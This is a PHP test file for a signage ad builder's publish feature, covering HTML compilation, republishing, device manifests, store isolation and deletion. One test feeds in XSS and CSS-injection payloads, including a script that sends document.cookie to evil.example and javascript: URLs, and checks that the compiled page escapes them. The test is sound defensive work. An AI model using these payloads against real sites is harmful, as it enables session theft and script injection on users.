<?php

use App\Models\BuilderAd;
use App\Models\BuilderAsset;
use App\Models\Media;
use App\Models\PlaylistItem;
use App\Models\Screen;
use App\Models\Store;
use Illuminate\Support\Facades\Storage;

/*
|--------------------------------------------------------------------------
| Publishing an ad — the bridge to the screens
|--------------------------------------------------------------------------
|
| docs/AD-BUILDER-SPEC.md §9. Publishing compiles the design into one self-contained page and writes a
| `media` row of type `html`, which is the only thing playlists, schedules, the device manifest and the
| player ever see. Two things matter most here: the page must carry the design, and it must carry
| NOTHING a person typed as code.
|
*/

beforeEach(function () {
    Storage::fake('public');

    $this->store = Store::factory()->create(['name' => 'Alpha Mart']);
    $this->other = Store::factory()->create(['name' => 'Beta Deli']);
    $this->designer = createStoreUser($this->store, ['ad-view', 'ad-store', 'ad-update', 'ad-destroy', 'screen-view', 'screen-playlist'], 'Designer');
    $this->actingAs($this->designer)->withSession(['current_store_id' => $this->store->id]);
});

test('publishing writes a page and puts it in the library as an html media row', function () {
    $ad = BuilderAd::factory()->withText('Winter sale')->create(['store_id' => $this->store->id, 'name' => 'Winter sale']);

    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $ad->refresh();
    $media = Media::sole();

    expect($ad->media_id)->toBe($media->id)
        ->and($ad->isPublished())->toBeTrue()
        ->and($media->type)->toBe(Media::TYPE_HTML)
        ->and($media->mime_type)->toBe('text/html')
        ->and($media->store_id)->toBe($this->store->id)
        ->and($media->title)->toBe('Winter sale')
        ->and($media->width)->toBe(1920)
        ->and($media->height)->toBe(1080);

    Storage::disk('public')->assertExists($media->path);

    $html = Storage::disk('public')->get($media->path);

    expect($html)->toContain('Winter sale')
        ->toContain('width: 1920px')
        ->toContain('height: 1080px')
        ->toContain('<!doctype html>');
});

test('nothing a person typed is ever written as code', function () {
    $document = BuilderAd::blankDocument();
    $document['stage']['background']['color'] = '#000; } body { background: url(https://evil.example/x) ';
    $document['elements'] = [[
        'id' => 'el_1', 'type' => 'text', 'name' => 'Nasty',
        'x' => 0, 'y' => 0, 'w' => 800, 'h' => 200, 'z' => 0, 'opacity' => 1, 'rotation' => 0,
        'text' => '<script>fetch("https://evil.example/"+document.cookie)</script>',
        'style' => [
            'color' => 'red; background: url(javascript:alert(1))',
            'fontFamily' => "Arial'; } * { display:none } .x{",
            'fontSize' => '99999',
            'align' => 'left"><script>alert(1)</script>',
        ],
        'animations' => [],
    ]];

    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'name' => 'Nasty', 'document' => $document]);

    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    // The words are there — as WORDS. "evil.example" appears, escaped, inside the text the person
    // typed; what must not appear is a tag, a URL the browser would fetch, or a rule that got out of
    // its declaration.
    expect($html)->toContain('&lt;script&gt;')
        ->toContain('&lt;/script&gt;')
        ->not->toContain('<script>fetch')
        ->not->toContain('url(https://evil.example')
        ->not->toContain('javascript:')
        ->not->toContain('display:none');

    // The one script in the page is the stage-scaling one this compiler writes.
    expect(substr_count($html, '<script>'))->toBe(1);

    // And the values that were not colours, sizes or alignments fell back to the safe ones.
    expect($html)->toContain('text-align:left;')        // not the alignment with a tag in it
        ->toContain('color:#ffffff;')                   // not "red; background: url(javascript:…)"
        ->toContain('font-size:2000px;')                // clamped, not 99999
        ->toContain('background-color:#000000;');       // not the colour that tried to close the rule

    // A real family name, meanwhile, survives exactly as it was written.
    $document = BuilderAd::blankDocument();
    $document['elements'] = [[
        'id' => 'el_1', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 800, 'h' => 200, 'z' => 0,
        'text' => 'Sale', 'style' => ['fontFamily' => 'Playfair Display'], 'animations' => [],
    ]];
    $plain = BuilderAd::factory()->create(['store_id' => $this->store->id, 'name' => 'Plain', 'document' => $document]);
    $this->postJson("/builder/{$plain->id}/publish")->assertOk();

    expect(Storage::disk('public')->get($plain->fresh()->media->path))
        ->toContain("font-family:'Playfair Display', sans-serif;");
});

test('publishing again refreshes the same media row, so the playlists keep it', function () {
    $ad = BuilderAd::factory()->withText('First')->create(['store_id' => $this->store->id, 'name' => 'Promo']);

    $this->postJson("/builder/{$ad->id}/publish")->assertOk();
    $media = Media::sole();

    // It is on a screen now.
    $screen = Screen::factory()->create(['store_id' => $this->store->id]);
    PlaylistItem::create(['screen_id' => $screen->id, 'media_id' => $media->id, 'position' => 0, 'duration_seconds' => 12]);

    // Change the design and publish again.
    $document = $ad->document;
    $document['elements'][0]['text'] = 'Second';
    $ad->update(['document' => $document, 'name' => 'Promo v2']);

    $response = $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    expect(Media::count())->toBe(1)
        ->and(Media::sole()->id)->toBe($media->id)
        ->and(Media::sole()->title)->toBe('Promo v2')
        ->and(PlaylistItem::where('media_id', $media->id)->count())->toBe(1)
        ->and($response->json('message'))->toContain('1 screen');

    expect(Storage::disk('public')->get(Media::sole()->path))->toContain('Second')->not->toContain('First');
});

test('a published ad plays like any other file — the device gets it with its own seconds', function () {
    $ad = BuilderAd::factory()->withText('On air')->create(['store_id' => $this->store->id, 'name' => 'On air']);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $screen = Screen::factory()->withToken('ad-token')->create(['store_id' => $this->store->id]);
    PlaylistItem::create(['screen_id' => $screen->id, 'media_id' => Media::sole()->id, 'position' => 0, 'duration_seconds' => 15]);

    $manifest = $this->withHeader('Authorization', 'Bearer ad-token')->getJson('/device/playlist')->assertOk()->json();
    $item = collect($manifest['items'] ?? [])->firstWhere('type', 'html');

    expect($item)->not->toBeNull()
        ->and($item['duration'])->toBe(15)
        ->and($item['url'])->toContain('/builder/')
        ->and($item['checksum'])->not->toBeEmpty();
});

test('an ad only ever compiles with its own store’s pictures', function () {
    $mine = BuilderAsset::factory()->create(['store_id' => $this->store->id, 'path' => 'builder/1/assets/mine.jpg']);
    $theirs = BuilderAsset::factory()->create(['store_id' => $this->other->id, 'path' => 'builder/2/assets/theirs.jpg']);

    $document = BuilderAd::blankDocument();
    $document['elements'] = [
        ['id' => 'a', 'type' => 'image', 'x' => 0, 'y' => 0, 'w' => 400, 'h' => 300, 'z' => 0, 'assetId' => $mine->id, 'style' => [], 'animations' => []],
        ['id' => 'b', 'type' => 'image', 'x' => 500, 'y' => 0, 'w' => 400, 'h' => 300, 'z' => 1, 'assetId' => $theirs->id, 'style' => [], 'animations' => []],
    ];

    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $html = Storage::disk('public')->get(Media::sole()->path);

    expect($html)->toContain('mine.jpg')->not->toContain('theirs.jpg');
});

test('deleting the ad takes the published page off the screens', function () {
    $ad = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);
    $this->postJson("/builder/{$ad->id}/publish")->assertOk();

    $media = Media::sole();
    $screen = Screen::factory()->create(['store_id' => $this->store->id]);
    PlaylistItem::create(['screen_id' => $screen->id, 'media_id' => $media->id, 'position' => 0, 'duration_seconds' => 10]);

    $response = $this->deleteJson("/builder/{$ad->id}", ['password' => 'password'])->assertOk();

    expect($response->json('message'))->toContain('playlist')
        ->and(Media::find($media->id))->toBeNull()
        ->and(PlaylistItem::where('media_id', $media->id)->count())->toBe(0);

    Storage::disk('public')->assertMissing($media->path);
});
